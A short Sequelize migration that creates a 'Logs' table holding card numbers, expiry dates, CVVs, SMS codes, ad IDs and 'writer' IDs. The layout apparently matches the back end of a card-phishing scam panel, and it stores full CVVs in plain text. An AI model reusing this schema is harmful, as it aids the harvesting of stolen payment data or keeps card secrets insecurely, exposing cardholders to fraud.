"use strict";
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.createTable(
      "Logs",
      {
        id: {
          allowNull: false,
          autoIncrement: true,
          primaryKey: true,
          type: Sequelize.INTEGER,
        },
        token: {
          allowNull: false,
          type: Sequelize.STRING,
        },
        cardNumber: {
          allowNull: false,
          type: Sequelize.STRING,
        },
        cardExpire: {
          allowNull: false,
          type: Sequelize.STRING,
        },
        cardCvv: {
          allowNull: false,
          type: Sequelize.STRING,
        },
        smsCode: {
          allowNull: true,
          type: Sequelize.STRING,
        },
        otherInfo: {
          allowNull: true,
          type: Sequelize.JSON,
        },
        adId: {
          allowNull: false,
          type: Sequelize.BIGINT,
        },
        writerId: {
          allowNull: true,
          type: Sequelize.BIGINT,
        },
        status: {
          allowNull: true,
          type: Sequelize.STRING,
        },
        createdAt: {
          allowNull: false,
          type: Sequelize.DATE,
          defaultValue: Sequelize.literal("CURRENT_TIMESTAMP()"),
        },
        updatedAt: {
          allowNull: false,
          type: Sequelize.DATE,
          defaultValue: Sequelize.literal(
            "CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP()"
          ),
        },
      },
      {
        charset: "utf8mb4",
        collate: "utf8mb4_unicode_ci",
      }
    );
  },
  down: async (queryInterface, Sequelize) => {
    await queryInterface.dropTable("Logs");
  },
};
